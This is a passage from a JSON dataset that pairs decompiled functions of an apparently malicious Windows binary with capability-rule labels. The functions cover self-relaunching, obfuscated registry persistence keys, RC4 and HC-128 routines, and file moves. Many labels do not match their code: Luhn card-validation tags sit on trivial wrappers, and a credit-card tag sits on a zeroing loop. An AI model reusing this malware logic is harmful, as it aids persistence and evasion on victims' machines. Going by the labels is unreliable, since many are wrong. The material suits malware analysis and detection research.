>> 0x10;\n            iStack8 = iStack8 + 1;\n            uStack3 = uStack3 + 1;\n        }\n        iStack8 = iStack8 + *0x427200 + -8;\n    }\n    return;\n}\n",
        "token_count": 482
    },
    "0040c631": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid fcn.0040c631(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uchar auStack2080 [516];\n    uchar auStack1564 [516];\n    uchar auStack1048 [516];\n    uchar auStack532 [516];\n    int32_t iStack16;\n    \n    cVar1 = fcn.0040aed7(auStack532, 0x204);\n    if (cVar1 == '\\x01') {\n        fcn.0041a907(0x41e640, auStack1048, 0x204);\n        cVar1 = fcn.0040b97c(1);\n        if (cVar1 != '\\0') {\n            iVar2 = fcn.0041a1d8(auStack1048, auStack532);\n            if (iVar2 != 0) {\n                for (iStack16 = 0; iStack16 < 8; iStack16 = iStack16 + 1) {\n                    fcn.0040a9af(auStack1048);\n                    cVar1 = fcn.0040aa34(auStack1048);\n                    if (cVar1 != '\\0') {\n                        fcn.0040b294(1000);\n                    }\n                }\n                cVar1 = fcn.0040ace1(auStack1048);\n                if (cVar1 != '\\0') {\n                    cVar1 = fcn.0040aaaa(auStack532, auStack1048);\n                    if (cVar1 != '\\0') {\n                        cVar1 = fcn.0040b97c(2);\n                        if (cVar1 == '\\0') {\n                            fcn.0041a59f(auStack1564, 0, 0x204);\n                        }\n                        else {\n                            fcn.00419fa8(auStack1564, 0x204, \"-m \\\"%s\\\"\", auStack532);\n                        }\n                        cVar1 = fcn.0040aa34(auStack1048);\n                        if (cVar1 != '\\0') {\n                            fcn.0040a8af(auStack1048, auStack1564, 1);\n    // WARNING: Subroutine does not return\n                            sub.KERNEL32.dll_ExitProcess(0);\n                        }\n                    }\n                }\n            }\n        }\n        cVar1 = fcn.0040b97c(2);\n        if (cVar1 != '\\0') {\n            fcn.0040c535();\n        }\n        cVar1 = fcn.0040caf6();\n        if (cVar1 != '\\x01') {\n            cVar1 = fcn.0040b97c(0x20);\n            if (cVar1 != '\\0') {\n    // WARNING: Subroutine does not return\n                sub.KERNEL32.dll_ExitProcess(0);\n            }\n        }\n        cVar1 = fcn.0040b97c(0x200);\n        if (cVar1 != '\\0') {\n            fcn.0040bb33();\n        }\n        cVar1 = fcn.0040b97c(8);\n        if (cVar1 != '\\0') {\n            uVar3 = fcn.0040b60e(\"MT_qUDrj\\\\F4Y0W6W85\\\\U4RSWg6\\\\PQ00dR5zd064WR\\\\rQR\\\\\");\n            fcn.00416ae2(0x80000001, uVar3, 0x41e6c4, 1, auStack532);\n        }\n        cVar1 = fcn.0040b97c(0x10);\n        if (cVar1 != '\\0') {\n            uVar3 = fcn.0040b60e(\"MT_qUDrj\\\\F4Y0W6W85\\\\DY542d Md5Qs\\\\XR65CiidS PWlsWRdR56\\\\%6\");\n            fcn.00419fa8(auStack2080, 0x204, uVar3, 0x41e6e0);\n            fcn.00419fa8(auStack1564, 0x204, 0x41ede4, auStack532);\n            uVar3 = fcn.0040b60e(\"M5QV9C5I\");\n            fcn.00416ae2(0x80000002, auStack2080, uVar3, 1, auStack1564);\n        }\n        cVar1 = fcn.0040b97c(4);\n        if (cVar1 != '\\0') {\n            *0x424460 = sub.msvcrt.dll_fopen(auStack532, 0x41edf2);\n        }\n        cVar1 = fcn.0040b97c(0x40);\n        if (cVar1 != '\\0') {\n            fcn.0041a907(0x41e720, auStack1564, 0x204);\n            fcn.00419918(0x41e720, auStack1564, 0x81);\n            fcn.0040b2ab(0x40e2dd, 0);\n        }\n        fcn.0040cfc5(0x427220);\n    }\n    return;\n}\n",
        "token_count": 1162
    },
    "00405787": {
        "rules": [
            "parse credit card information/e6f146abe79f47cd84115fe8b7938431"
        ],
        "decompiled_code": "\nvoid fcn.00405787(int32_t param_1)\n\n{\n    int32_t iStack4;\n    \n    for (iStack4 = 0; iStack4 < 0x3c; iStack4 = iStack4 + 1) {\n        *(param_1 + iStack4 * 4) = 0;\n        *(param_1 + (iStack4 + 0x3c) * 4) = 0;\n    }\n    *(param_1 + 0x1e0) = 0;\n    return;\n}\n",
        "token_count": 122
    },
    "00405ca7": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nint32_t fcn.00405ca7(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iStack16;\n    \n    uVar1 = sub.msvcrt.dll_strlen(param_1);\n    iStack16 = (uVar1 >> 2) * 3;\n    if (*(param_1 + (uVar1 - 1)) == '=') {\n        if (*(param_1 + (uVar1 - 2)) == '=') {\n            iStack16 = iStack16 + -2;\n        }\n        else {\n            iStack16 = iStack16 + -1;\n        }\n    }\n    return iStack16;\n}\n",
        "token_count": 146
    },
    "00406115": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00406115(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    int16_t iStack6;\n    uint8_t uStack3;\n    uint8_t uStack2;\n    uint8_t uStack1;\n    \n    iStack6 = 0;\n    uStack3 = 0;\n    for (uStack1 = 1; uStack1 < 0x11; uStack1 = uStack1 + 1) {\n        for (uStack2 = 1; uStack2 <= *(param_1 + uStack1); uStack2 = uStack2 + 1) {\n            *(*(param_2 + uStack3) * 4 + param_3 + 2) = iStack6;\n            *(*(param_2 + uStack3) * 4 + param_3) = uStack1;\n            uStack3 = uStack3 + 1;\n            iStack6 = iStack6 + 1;\n        }\n        iStack6 = iStack6 << 1;\n    }\n    return;\n}\n",
        "token_count": 240
    },
    "00406257": {
        "rules": [
            "encrypt data using HC-128/b24f3f77371449e18042164d6f6569c2"
        ],
        "decompiled_code": "\nvoid fcn.00406257(void)\n\n{\n    uint16_t uStack6;\n    uint16_t uStack4;\n    uint16_t uStack2;\n    \n    for (uStack2 = 0; uStack2 < 0x100; uStack2 = uStack2 + 1) {\n        *(uStack2 * 4 + 0x421b20) = uStack2 * 0x4c8b;\n        *(uStack2 * 4 + 0x422720) = uStack2 * -0x2b32;\n        *(uStack2 * 4 + 0x423320) = uStack2 << 0xf;\n    }\n    for (uStack4 = 0; uStack4 < 0x100; uStack4 = uStack4 + 1) {\n        *(uStack4 * 4 + 0x421f20) = uStack4 * 0x9646;\n        *(uStack4 * 4 + 0x422b20) = uStack4 * -0x54cc;\n        *(uStack4 * 4 + 0x423720) = uStack4 * -0x6b2e;\n    }\n    for (uStack6 = 0; uStack6 < 0x100; uStack6 = uStack6 + 1) {\n        *(uStack6 * 4 + 0x422320) = uStack6 * 0x1d2f;\n        *(uStack6 * 4 + 0x422f20) = uStack6 << 0xf;\n        *(uStack6 * 4 + 0x423b20) = uStack6 * -0x14d0;\n    }\n    return;\n}\n",
        "token_count": 382
    },
    "004158f7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nvoid fcn.004158f7(uint param_1, uchar param_2, uchar param_3)\n\n{\n    int32_t iStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    int32_t aiStack16 [4];\n    \n    aiStack16[0] = 0;\n    iStack20 = 0;\n    iStack24 = 0;\n    // switch table (10 cases) at 0x420164\n    switch(param_3) {\n    default:\n        aiStack16[0] = fcn.00410aa1(6);\n        iStack20 = fcn.00410aa1(1);\n        if (iStack20 != 0) {\n            aiStack16[0] = fcn.0041a022(aiStack16, 0xffffffff, &iStack20, 0xffffffff, 1);\n        }\n        iStack20 = fcn.004157a7();\n        if (iStack20 != 0) {\n            aiStack16[0] = fcn.0041a022(aiStack16, 0xffffffff, &iStack20, 0xffffffff, 1);\n        }\n        iStack20 = fcn.00415817();\n        if (iStack20 != 0) {\n            aiStack16[0] = fcn.0041a022(aiStack16, 0xffffffff, &iStack20, 0xffffffff, 1);\n        }\n        iStack20 = fcn.004156c7();\n        if (iStack20 != 0) {\n            aiStack16[0] = fcn.0041a022(aiStack16, 0xffffffff, &iStack20, 0xffffffff, 1);\n        }\n        iStack20 = fcn.00415737();\n        if (iStack20 != 0) {\n            aiStack16[0] = fcn.0041a022(aiStack16, 0xffffffff, &iStack20, 0xffffffff, 1);\n        }\n        iStack20 = fcn.00415887();\n        if (iStack20 != 0) {\n            aiStack16[0] = fcn.0041a022(aiStack16, 0xffffffff, &iStack20, 0xffffffff, 1);\n        }\n        if (aiStack16[0] != 0) {\n            iStack24 = sub.msvcrt.dll_strlen(aiStack16[0]);\n        }\n        iStack20 = fcn.00414dea(&iStack28);\n        if (iStack20 != 0) {\n            aiStack16[0] = fcn.0041a022(aiStack16, iStack24, &iStack20, iStack28, 1);\n            iStack24 = iStack28 + iStack24;\n        }\n        break;\n    case 1:\n        aiStack16[0] = fcn.00410aa1(1);\n        if (aiStack16[0] != 0) {\n            iStack24 = sub.msvcrt.dll_strlen(aiStack16[0]);\n        }\n        break;\n    case 2:\n        aiStack16[0] = fcn.00414dea(&iStack24);\n        break;\n    case 3:\n        aiStack16[0] = fcn.00415887();\n        if (aiStack16[0] != 0) {\n            iStack24 = sub.msvcrt.dll_strlen(aiStack16[0]);\n        }\n        break;\n    case 4:\n        aiStack16[0] = fcn.004156c7();\n        if (aiStack16[0] != 0) {\n            iStack24 = sub.msvcrt.dll_strlen(aiStack16[0]);\n        }\n        break;\n    case 5:\n        aiStack16[0] = fcn.00415737();\n        if (aiStack16[0] != 0) {\n            iStack24 = sub.msvcrt.dll_strlen(aiStack16[0]);\n        }\n        break;\n    case 6:\n        aiStack16[0] = fcn.00410aa1(6);\n        if (aiStack16[0] != 0) {\n            iStack24 = sub.msvcrt.dll_strlen(aiStack16[0]);\n        }\n        break;\n    case 8:\n        aiStack16[0] = fcn.004157a7();\n        if (aiStack16[0] != 0) {\n            iStack24 = sub.msvcrt.dll_strlen(aiStack16[0]);\n        }\n        break;\n    case 9:\n        aiStack16[0] = fcn.00415817();\n        if (aiStack16[0] != 0) {\n            iStack24 = sub.msvcrt.dll_strlen(aiStack16[0]);\n        }\n    }\n    fcn.0040b4bf(&iStack20);\n    fcn.00408b8f(param_1, param_2, aiStack16[0], iStack24);\n    if (aiStack16[0] != 0) {\n        fcn.0040b4bf(aiStack16);\n    }\n    return;\n}\n",
        "token_count": 1108
    },
    "004164a5": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nvoid fcn.004164a5(int32_t param_1, uint32_t param_2)\n\n{\n    uchar uVar1;\n    uint32_t uVar2;\n    uint32_t uStack8;\n    \n    for (uStack8 = 0; uStack8 < param_2; uStack8 = uStack8 + 1) {\n        uVar2 = fcn.00416487(1, 0xff);\n        if (uVar2 < 0x80) {\n            uVar1 = fcn.00416487(uVar2, 0xff);\n            *(param_1 + uStack8) = uVar1;\n        }\n        else {\n            uVar1 = fcn.00416487(uVar2 - 0x7f, 0xff);\n            *(param_1 + uStack8) = uVar1;\n        }\n    }\n    return;\n}\n",
        "token_count": 195
    },
    "00417830": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nchar fcn.00417830(uint param_1, uint param_2, int32_t param_3, uchar *param_4)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    int32_t in_stack_00000020;\n    uint32_t uStack672;\n    uint uStack668;\n    int32_t iStack664;\n    uint uStack660;\n    uchar **ppuStack656;\n    uchar **ppuStack652;\n    char *pcStack648;\n    int32_t *piStack644;\n    uint32_t uStack640;\n    uint uStack636;\n    uint uStack632;\n    uint32_t **ppuStack628;\n    uint uStack624;\n    uchar *puStack620;\n    int32_t iStack616;\n    uchar *puStack612;\n    int32_t iStack608;\n    uchar *puStack604;\n    int32_t iStack600;\n    uchar *puStack596;\n    uchar *puStack592;\n    uint32_t *puStack588;\n    uchar auStack584 [24];\n    uchar auStack560 [420];\n    int32_t iStack140;\n    int32_t iStack136;\n    uint uStack132;\n    int32_t iStack128;\n    char cStack117;\n    uchar uStack113;\n    uint uStack108;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    int32_t iStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    int32_t iStack68;\n    uint32_t uStack60;\n    int32_t iStack56;\n    uchar uStack49;\n    uint32_t uStack44;\n    uchar auStack40 [8];\n    uint uStack32;\n    int32_t iStack28;\n    uint uStack24;\n    char cStack13;\n    \n    cStack13 = 0;\n    switch(in_stack_00000020) {\n    case 1:\n        puStack588 = &uStack44;\n        puStack592 = auStack40;\n        puStack596 = NULL;\n        iStack600 = 0xf003f;\n        puStack604 = NULL;\n        iStack608 = 0;\n        puStack612 = NULL;\n        iStack616 = param_3;\n        puStack620 = param_2;\n        uStack624 = 0x4178b8;\n        iVar1 = sub.ADVAPI32.DLL_RegCreateKeyExA();\n        uStack49 = iVar1 == 0;\n        if (uStack49) {\n            uStack636 = uStack24;\n            uStack640 = iStack28;\n            pcStack648 = \"%c%.8x%s\";\n            ppuStack652 = 0x204;\n            ppuStack656 = &puStack596;\n            uStack660 = 0x417912;\n            piStack644 = fcn.00419fa8();\n            if (0 < piStack644) {\n                pcStack648 = &puStack596;\n                ppuStack652 = 0xe7;\n                ppuStack656 = uStack32;\n                uStack660 = 0x417951;\n                iStack56 = piStack644;\n                fcn.00408b8f();\n            }\n        }\n        break;\n    case 2:\n        puStack604 = auStack40;\n        iStack608 = 0x2001f;\n        puStack612 = NULL;\n        iStack616 = param_3;\n        puStack620 = param_2;\n        uStack624 = 0x41798b;\n        iVar1 = sub.ADVAPI32.DLL_RegOpenKeyExA();\n        if (iVar1 == 0) {\n            puStack620 = param_2;\n            uStack624 = param_1;\n            uStack632 = 0;\n            uStack640 = uStack60;\n            piStack644 = 0x4179d5;\n            iVar1 = sub.ADVAPI32.DLL_RegSetValueExA();\n            uStack60 = uStack60 & 0xffffff | (iVar1 == 0) << 0x18;\n            iStack664 = iStack84;\n            uStack668 = 0x4179f3;\n            sub.ADVAPI32.DLL_RegCloseKey();\n        }\n        if ((cStack117 != '\\0') &&\n           (iStack128 = fcn.00419fa8(&iStack664, 0x204, \"%c%.8x%s\", uStack72, uStack96, uStack92),  0 < iStack128)) {\n            fcn.00408b8f(uStack100, 0xe7, &iStack664, iStack128);\n        }\n        break;\n    case 3:\n        puStack612 = param_4;\n        iStack616 = param_3;\n        puStack620 = param_2;\n        uStack624 = 0x417aaa;\n        cStack13 = fcn.00416dc5();\n        if (cStack13 != '\\0') {\n            puStack596 = param_4;\n            iStack600 = param_3;\n            puStack604 = param_2;\n            iStack608 = in_stack_00000020;\n            puStack612 = 0x420268;\n            iStack616 = 0x204;\n            puStack620 = auStack560;\n            uStack624 = 0x417b07;\n            iStack608 = fcn.00419fa8();\n            if (0 < iStack608) {\n                puStack612 = auStack560;\n                iStack616 = 0xe7;\n                puStack620 = param_1;\n                uStack624 = 0x417b46;\n                iStack28 = iStack608;\n                fcn.00408b8f();\n            }\n        }\n        break;\n    case 4:\n        puStack604 = auStack40;\n        iStack608 = 0x2001f;\n        puStack612 = NULL;\n        iStack616 = param_3;\n        puStack620 = param_2;\n        uStack624 = 0x417b80;\n        iVar1 = sub.ADVAPI32.DLL_RegOpenKeyExA();\n        if (iVar1 == 0) {\n            uStack640 = uStack60;\n            piStack644 = 0x417ba1;\n            iVar1 = sub.ADVAPI32.DLL_RegDeleteValueA();\n            uStack44 = uStack44 & 0xffffff | (iVar1 == 0) << 0x18;\n            pcStack648 = iStack68;\n            ppuStack652 = 0x417bbf;\n            sub.ADVAPI32.DLL_RegCloseKey();\n        }\n        if ((cStack117 != '\\0') &&\n           (iStack136 = fcn.00419fa8(&iStack664, 0x204, \"%c%.8x%s\\\\%s\", uStack72, uStack96, uStack92, uStack88), \n           0 < iStack136)) {\n            fcn.00408b8f(uStack100, 0xe7, &iStack664, iStack136);\n        }\n        break;\n    case 6:\n        puStack604 = auStack40;\n        iStack608 = 0x2001f;\n        puStack612 = NULL;\n        iStack616 = param_3;\n        puStack620 = param_2;\n        uStack624 = 0x417c91;\n        uStack636 = unaff_EBX;\n        iVar1 = sub.ADVAPI32.DLL_RegOpenKeyExA();\n        if (iVar1 == 0) {\n            puStack620 = auStack584;\n            uStack624 = 0;\n            ppuStack628 = &puStack588;\n            uStack632 = 0;\n            uStack640 = uStack60;\n            piStack644 = 0x417cd6;\n            iVar1 = sub.ADVAPI32.DLL_RegQueryValueExA();\n            if (iVar1 == 0) {\n                uStack660 = 1;\n                iStack664 = iStack608;\n                uStack668 = 0x417cf5;\n                iStack616 = sub.msvcrt.dll_calloc();\n                if (iStack616 != 0) {\n                    piStack644 = &iStack608;\n                    ppuStack652 = &puStack612;\n                    ppuStack656 = NULL;\n                    uStack660 = iStack28;\n                    iStack664 = iStack84;\n                    uStack668 = 0x417d3f;\n                    pcStack648 = iStack616;\n                    iVar1 = sub.ADVAPI32.DLL_RegQueryValueExA();\n                    if (iVar1 == 0) {\n                        uStack668 = uStack632;\n                        uStack672 = uStack640;\n                        iVar1 = sub.ADVAPI32.DLL_RegSetValueExA(uStack108, uStack44, 0, uStack636);\n                        if (iVar1 == 0) {\n                            iVar1 = sub.ADVAPI32.DLL_RegDeleteValueA(uStack132, uStack76);\n                            uStack113 = iVar1 == 0;\n                        }\n                    }\n                    fcn.0040b4bf(&uStack672);\n                }\n            }\n            sub.ADVAPI32.DLL_RegCloseKey(iStack140);\n            if ((cStack117 != '\\0') &&\n               (iStack140 = fcn.00419fa8(&iStack664, 0x204, \"%c%.8x%s\\\\%s\\a%s\", uStack72, uStack96, uStack92, uStack80, \n                                         uStack88),  0 < iStack140)) {\n                fcn.00408b8f(uStack100, 0xe7, &iStack664, iStack140);\n            }\n        }\n    }\n    return cStack117;\n}\n",
        "token_count": 2128
    },
    "00414f74": {
        "rules": [
            "hash data using aphash/0253f481fbfe42f6972c4d360912dc99"
        ],
        "decompiled_code": "\nuint32_t fcn.00414f74(uint8_t *param_1, int32_t *param_2)\n\n{\n    uint32_t uStack8;\n    uint8_t uStack1;\n    \n    *param_2 = 1;\n    uStack1 = *param_1;\n    uStack8 = uStack1 & 0x7f;\n    do {\n        if (-1 < uStack1) {\n            return uStack8;\n        }\n        uStack1 = param_1[*param_2];\n        uStack8 = uStack8 << 7 | uStack1 & 0x7f;\n        *param_2 = *param_2 + 1;\n    } while (*param_2 < 5);\n    return uStack8;\n}\n",
        "token_count": 167
    },
    "00416374": {
        "rules": [
            "hash data using aphash/ab9c9a8537c84744923d9bbb8bd71d10"
        ],
        "decompiled_code": "\nuint32_t fcn.00416374(void)\n\n{\n    uint32_t uVar1;\n    \n    *0x41e8e8 = *0x41e8e8 ^ *0x41e8e8 << 0xb;\n    uVar1 = *0x41e8e8 >> 8 ^ *0x41e8e8 ^ *0x41e8f4 >> 0x13 ^ *0x41e8f4;\n    *0x41e8e8 = *0x41e8ec;\n    *0x41e8ec = *0x41e8f0;\n    *0x41e8f0 = *0x41e8f4;\n    *0x41e8f4 = uVar1;\n    return uVar1;\n}\n",
        "token_count": 179
    },
    "004165ec": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nuint * fcn.004165ec(uint *param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint8_t uVar1;\n    uint *puVar2;\n    int32_t iStack12;\n    uint32_t uStack8;\n    uint *puStack4;\n    \n    uStack8 = 0;\n    iStack12 = 0;\n    *param_1 = 0;\n    param_1[1] = 0;\n    puVar2 = param_1;\n    for (puStack4 = NULL; puStack4 < 0x100; puStack4 = puStack4 + 1) {\n        *(puStack4 + param_1 + 8) = puStack4;\n        puVar2 = puStack4;\n    }\n    for (puStack4 = NULL; puStack4 < 0x100; puStack4 = puStack4 + 1) {\n        uVar1 = *(param_1 + puStack4 + 8);\n        uStack8 = *(param_2 + iStack12) + uStack8 + uVar1 & 0xff;\n        *(param_1 + puStack4 + 8) = *(param_1 + uStack8 + 8);\n        *(param_1 + uStack8 + 8) = uVar1;\n        puVar2 = (iStack12 + 1) / param_3;\n        iStack12 = (iStack12 + 1) % param_3;\n    }\n    return puVar2;\n}\n",
        "token_count": 336
    },
    "004166e1": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nint32_t fcn.004166e1(uint32_t *param_1, int32_t param_2, int32_t param_3, int32_t param_4, int32_t param_5)\n\n{\n    uint8_t auStack288 [256];\n    uint32_t uStack32;\n    uint32_t uStack28;\n    uint32_t uStack24;\n    uint32_t uStack20;\n    int32_t iStack16;\n    \n    if (param_4 != param_2) {\n        if (param_5 < param_3) {\n            return -1;\n        }\n        fcn.0041a5e1(param_4, param_2, param_3);\n    }\n    uStack20 = *param_1;\n    uStack24 = param_1[1];\n    for (iStack16 = 0; iStack16 < 0x100; iStack16 = iStack16 + 1) {\n        auStack288[iStack16] = *(param_1 + iStack16 + 8);\n    }\n    for (iStack16 = 0; iStack16 < param_3; iStack16 = iStack16 + 1) {\n        uStack20 = uStack20 + 1 & 0xff;\n        uStack28 = auStack288[uStack20];\n        uStack24 = auStack288[uStack20] + uStack24 & 0xff;\n        uStack32 = auStack288[uStack24];\n        auStack288[uStack20] = auStack288[uStack24];\n        auStack288[uStack24] = uStack28;\n        *(iStack16 + param_4) = auStack288[uStack32 + uStack28 & 0xff] ^ *(param_4 + iStack16);\n    }\n    return param_3;\n}\n",
        "token_count": 394
    },
    "00405d3b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.00405d3b(uint32_t param_1)\n\n{\n    fcn.00405d0c(param_1 >> 8 & 0xff);\n    fcn.00405d0c(param_1 & 0xff);\n    return;\n}\n",
        "token_count": 59
    },
    "00405e0d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.00405e0d(void)\n\n{\n    *0x421020 = 0xffdb;\n    *0x421022 = 0x84;\n    *0x421024 = 0;\n    *0x421065 = 1;\n    fcn.00405d70(0x41e0a0, *0x421008, 0x421025);\n    fcn.00405d70(0x41e0e0, *0x421008, 0x421066);\n    return;\n}\n",
        "token_count": 119
    },
    "00405e79": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.00405e79(void)\n\n{\n    uint8_t uStack1;\n    \n    *0x4210c0 = 0xffc4;\n    *0x4210c2 = 0x1a2;\n    *0x4210c4 = 0;\n    for (uStack1 = 0; uStack1 < 0x10; uStack1 = uStack1 + 1) {\n        *(uStack1 + 0x4210c5) = *(uStack1 + 0x41e121);\n    }\n    for (uStack1 = 0; uStack1 < 0xc; uStack1 = uStack1 + 1) {\n        *(uStack1 + 0x4210d5) = *(uStack1 + 0x41e134);\n    }\n    *0x4210e1 = 0x10;\n    for (uStack1 = 0; uStack1 < 0x10; uStack1 = uStack1 + 1) {\n        *(uStack1 + 0x4210e2) = *(uStack1 + 0x41e161);\n    }\n    for (uStack1 = 0; uStack1 < 0xa2; uStack1 = uStack1 + 1) {\n        *(uStack1 + 0x4210f2) = *(uStack1 + 0x41e180);\n    }\n    *0x421194 = 1;\n    for (uStack1 = 0; uStack1 < 0x10; uStack1 = uStack1 + 1) {\n        *(uStack1 + 0x421195) = *(uStack1 + 0x41e141);\n    }\n    for (uStack1 = 0; uStack1 < 0xc; uStack1 = uStack1 + 1) {\n        *(uStack1 + 0x4211a5) = *(uStack1 + 0x41e154);\n    }\n    *0x4211b1 = 0x11;\n    for (uStack1 = 0; uStack1 < 0x10; uStack1 = uStack1 + 1) {\n        *(uStack1 + 0x4211b2) = *(uStack1 + 0x41e225);\n    }\n    for (uStack1 = 0; uStack1 < 0xa2; uStack1 = uStack1 + 1) {\n        *(uStack1 + 0x4211c2) = *(uStack1 + 0x41e240);\n    }\n    return;\n}\n",
        "token_count": 582
    },
    "004061df": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004061df(void)\n\n{\n    fcn.00406115(0x41e120, 0x41e134, 0x421280);\n    fcn.00406115(0x41e140, 0x41e154, 0x4212c0);\n    fcn.00406115(0x41e160, 0x41e180, 0x421300);\n    fcn.00406115(0x41e224, 0x41e240, 0x421700);\n    return;\n}\n",
        "token_count": 125
    },
    "00407c84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00407c84(void)\n\n{\n    sub.WS2_32.dll_WSAGetLastError();\n    return;\n}\n",
        "token_count": 29
    },
    "0040aa11": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "move file"
        ],
        "decompiled_code": "\nuint32_t fcn.0040aa11(uint param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = sub.KERNEL32.dll_MoveFileA(param_1, param_2);\n    return uVar1 & 0xffffff00 | uVar1 != 0;\n}\n",
        "token_count": 71
    },
    "0040ac70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0040ac70(uint param_1)\n\n{\n    int32_t iVar1;\n    uchar auStack48 [16];\n    uint uStack32;\n    uint uStack28;\n    \n    iVar1 = sub.KERNEL32.dll_GetFileAttributesExA(param_1, 0, auStack48);\n    if (iVar1 == 0) {\n        uStack28 = 0xffffffff;\n        uStack32 = 0xffffffff;\n    }\n    return CONCAT44(uStack32, uStack28);\n}\n",
        "token_count": 111
    },
    "0040acbe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create directory"
        ],
        "decompiled_code": "\nuint32_t fcn.0040acbe(uint param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = sub.KERNEL32.dll_CreateDirectoryA(param_1, 0);\n    return uVar1 & 0xffffff00 | uVar1 != 0;\n}\n",
        "token_count": 65
    },
    "0040af4f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.0040af4f(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uchar auStack272 [272];\n    \n    fcn.0041a59f(param_1, 0, param_2);\n    cVar1 = fcn.0040aed7(auStack272, 0x104);\n    if (cVar1 == '\\x01') {\n        fcn.0041a682(auStack272, param_1, param_2);\n    }\n    return cVar1 == '\\x01';\n}\n",
        "token_count": 124
    },
    "0040afc7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040afc7(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    char acStack1048 [1024];\n    int32_t iStack24;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    fcn.0041a59f(acStack1048, 0, 0x400);\n    fcn.0041a59f(param_2, 0, param_3);\n    uVar4 = sub.KERNEL32.dll_GetCommandLineA();\n    fcn.00419918(acStack1048, uVar4, 0x400);\n    iStack16 = 0;\n    iStack20 = 0;\n    iStack24 = 0;\n    while( true ) {\n        while( true ) {\n            while( true ) {\n                iVar1 = iStack24;\n                iStack20 = 0;\n                if (acStack1048[iStack16] == '\\0') {\n                    return 0;\n                }\n                if (acStack1048[iStack16] != '\\\"') break;\n                iStack16 = iStack16 + 1;\n                while ((iVar3 = iStack16,  iVar2 = iStack20,  acStack1048[iStack16] != '\\\"' &&\n                       (acStack1048[iStack16] != '\\0'))) {\n                    iStack20 = iStack20 + 1;\n                    iStack16 = iStack16 + 1;\n                    *(iVar2 + param_2) = acStack1048[iVar3];\n                }\n                *(param_2 + iStack20) = 0;\n                iStack24 = iStack24 + 1;\n                if (iVar1 == param_1) {\n                    return 1;\n                }\n                iStack16 = iStack16 + 1;\n                iStack20 = 0;\n            }\n            if (acStack1048[iStack16] != ' ') break;\n            iStack16 = iStack16 + 1;\n            param_1 = param_1 + 1;\n        }\n        while ((iVar3 = iStack16,  iVar2 = iStack20,  acStack1048[iStack16] != ' ' && (acStack1048[iStack16] != '\\0')))\n        {\n            iStack20 = iStack20 + 1;\n            iStack16 = iStack16 + 1;\n            *(iVar2 + param_2) = acStack1048[iVar3];\n        }\n        *(param_2 + iStack20) = 0;\n        iStack24 = iStack24 + 1;\n        if (iVar1 == param_1) break;\n        iStack16 = iStack16 + 1;\n        iStack20 = 0;\n    }\n    return 1;\n}\n",
        "token_count": 629
    },
    "0040b4bf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
